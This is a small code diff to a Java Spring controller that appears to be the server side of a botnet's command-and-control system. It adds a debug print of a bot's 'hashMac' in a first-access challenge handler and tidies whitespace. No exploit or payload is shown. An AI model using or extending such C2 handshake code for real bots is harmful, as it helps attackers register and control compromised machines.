@@ -87,10 +87,12 @@ public class CommandController {
    	@ResponseBody
    	public String botFirstAccesSecondPhase(@RequestBody String hashMac, HttpServletResponse error,HttpServletRequest request) throws IOException {  
     	String response="";
-		System.out.println("3");
+		System.out.println("hashMac="+hashMac);
 
     	if(engineBot.isCommandandconquerStatus()){
     			if(auth.findBotChallengeInfo(request.getRemoteAddr())){
+    				
+    				
     				
     				IP ip=new IP(request.getRemoteAddr());
     				Long keyNumber=auth.getBotSeed().get(ip).getValue1();
@@ -102,10 +104,7 @@ public class CommandController {
     	}else{
     		response= "Challenge Error";
     		error.sendError(HttpStatus.SC_NOT_FOUND);
-    	}
-    	
-    
-    	
+    	}  	
     	return response;
    	}
     
